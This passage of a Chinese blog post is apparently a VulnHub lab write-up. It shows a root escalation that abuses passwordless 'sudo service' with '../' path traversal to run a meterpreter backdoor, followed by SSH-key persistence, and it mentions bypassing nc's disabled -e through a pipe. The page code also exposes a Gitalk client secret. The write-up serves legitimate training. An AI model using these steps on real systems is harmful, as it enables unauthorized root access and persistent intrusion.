+<h2 id="Get-root"><a href="#Get-root" class="headerlink" title="Get root"></a>Get root</h2><p>sudo -l 查看当前可以进行的sudo 命令，发现可以免密执行sudo service。<br>审计service脚本，发现可以利用类似php文件包含类似的思路来进行目录穿越，执行其他目录下的脚本。<br>审了我整整两天才发现的洞啊。<br><img src="https://i.loli.net/2019/10/24/TM5GeOqiswzU2hL.png" alt=""><br>这个位置上没有过滤serv ice中的../，直接下一行就exec执行了。构造../../../之类的就可以劫持目录到任意位置。<br>最后的payload：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service ..//..//..//home//webmaster//2333  bbbb cccc</span><br></pre></td></tr></table></figure></p>
+<p>2333是我最开始生成的meterpreter后门文件。<br>像之前一样设置msf，就可以看到一个root权限的meterpreter环境弹回来。</p>
+<h2 id="root持久化"><a href="#root持久化" class="headerlink" title="root持久化"></a>root持久化</h2><p>和普通用户持久化一样，设置下.ssh文件夹，之后可以ssh免密连接。<br><img src="https://i.loli.net/2019/10/24/t74NHJXY3kgMT6d.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>说实话，我感觉我走的有点偏，这个似乎是想让你用sql注入的方式搞出来的，而不是拿到webshell后登录查询搞出来。<br>后面我还拿到webmaster的密码对应的md5值，可惜跑遍字典都没能还原出密码。暂时卡在这里。对于提权还没有什么思路。也试过几个cve，可惜都跑不动。常见的sudo错配问题也试过，没有用。<br><img src="https://i.loli.net/2019/10/20/jSB4FxRyJGVhWrH.png" alt=""><br>审计两天service脚本，shell脚本的语法也看了个七七八八。学到了Ubuntu下函数调用时的栈对齐，可以用管道文件绕过阉割-e的nc。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/VulnHub/" rel="tag"><i class="fa fa-tag"></i> VulnHub</a>
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/18/msf-intranet-scanner/" rel="next" title="msf内网扫描">
+                <i class="fa fa-chevron-left"></i> msf内网扫描
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/10/vulnHub-EVM-1/" rel="prev" title="vulnHub-EVM-1">
+                vulnHub-EVM-1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div id="gitalk-container">
+    </div>
+    
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://i.loli.net/2018/12/22/5c1db6b0a0ab4.jpg" alt="Amadeus">
+            
+              <p class="site-author-name" itemprop="name">Amadeus</p>
+              <p class="site-description motion-element" itemprop="description">Security Edge Research Net，一个misc选手存放日志的地方</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">25</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机环境"><span class="nav-number">1.</span> <span class="nav-text">靶机环境</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#10-24-获得所有flag（6-6）"><span class="nav-number">1.1.</span> <span class="nav-text">10-24 获得所有flag（6/6）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-20-暂未取得所有flag（4-6）"><span class="nav-number">1.2.</span> <span class="nav-text">10-20 暂未取得所有flag（4/6）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息搜集"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进行渗透"><span class="nav-number">3.</span> <span class="nav-text">进行渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-number">3.1.</span> <span class="nav-text">ftp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80端口"><span class="nav-number">3.2.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后渗透阶段"><span class="nav-number">4.</span> <span class="nav-text">后渗透阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#普通用户权限"><span class="nav-number">4.1.</span> <span class="nav-text">普通用户权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#普通用户持久化"><span class="nav-number">4.2.</span> <span class="nav-text">普通用户持久化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-root"><span class="nav-number">4.3.</span> <span class="nav-text">Get root</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root持久化"><span class="nav-number">4.4.</span> <span class="nav-text">root持久化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Amadeus</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script color="0,255,0" opacity="0.5" zindex="-1" count="150" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.6.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.6.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <script src="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.js"></script>
+
+  
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.css">
+
+  
+  
+  <script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+   <script>
+        var gitalk = new Gitalk({
+          clientID: '31bd4e3112debc879d07',
+          clientSecret: 'a2e8ff9a5e17fd35e51bb5089941b48016d08810',
+          repo: 'SernRounder.github.io',
+          owner: 'SernRounder',
+          admin: ['SernRounder'],
+          id: md5(location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')
+       </script>
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
